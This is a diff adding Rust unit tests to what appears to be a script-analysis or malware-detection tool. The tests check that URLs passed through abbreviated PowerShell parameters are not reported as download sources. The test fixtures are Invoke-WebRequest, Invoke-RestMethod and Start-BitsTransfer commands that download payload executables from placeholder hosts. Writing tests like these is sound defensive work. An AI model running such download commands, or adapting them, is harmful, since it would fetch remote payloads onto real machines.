@@ -8278,6 +8278,35 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_abbreviated_header_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -He @{Referer="https://ps-short-header.example/landing"} -Uri https://ps-short-header-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-short-header-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-short-header.example/landing"
+                )
+            }),
+            "IWR abbreviated header URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn irm_header_urls_are_not_promoted_to_downloads() {
         let ps = r#"Invoke-RestMethod -Headers @{Origin="https://ps-origin.example"} -Uri https://ps-irm-actual.example/api"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
@@ -8357,6 +8386,34 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_abbreviated_useragent_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-WebRequest -UserA "Mozilla/5.0 https://ua-short.example/info" -Uri https://ps-ua-short-actual.example/payload.exe -OutFile payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://ps-ua-short-actual.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "actual IWR URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } if src == "https://ua-short.example/info"
+                )
+            }),
+            "IWR abbreviated UserAgent URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn irm_body_urls_are_not_promoted_to_downloads() {
         let ps = r#"Invoke-RestMethod -Uri https://ps-body-actual.example/api -Method Post -Body "next=https://ps-body-decoy.example/payload.exe""#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
@@ -8377,6 +8434,35 @@ mod ps1_url_extraction_tests {
                 )
             }),
             "IRM body URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn irm_abbreviated_body_urls_are_not_promoted_to_downloads() {
+        let ps = r#"Invoke-RestMethod -Uri https://ps-short-body-actual.example/api -Method Post -Bo "next=https://ps-short-body-decoy.example/payload.exe""#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-short-body-actual.example/api"
+                )
+            }),
+            "actual IRM URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-short-body-decoy.example/payload.exe"
+                )
+            }),
+            "IRM abbreviated body URL was promoted to Download: {:?}",
             report.traits
         );
     }
@@ -8804,6 +8890,35 @@ mod ps1_url_extraction_tests {
                 )
             }),
             "BITS proxy URL was promoted to Download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_bitstransfer_abbreviated_proxylist_url_is_not_promoted_to_download() {
+        let ps = r#"Start-BitsTransfer -ProxyL http://bits-proxy-short.example:8080 -Source https://bits-proxy-short-actual.example/bits.exe -Destination C:\Temp\bits.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://bits-proxy-short-actual.example/bits.exe"
+                            && dst.as_deref() == Some("C:\\Temp\\bits.exe")
+                )
+            }),
+            "actual BITS source URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://bits-proxy-short.example:8080"
+                )
+            }),
+            "BITS abbreviated ProxyList URL was promoted to Download: {:?}",
             report.traits
         );
     }
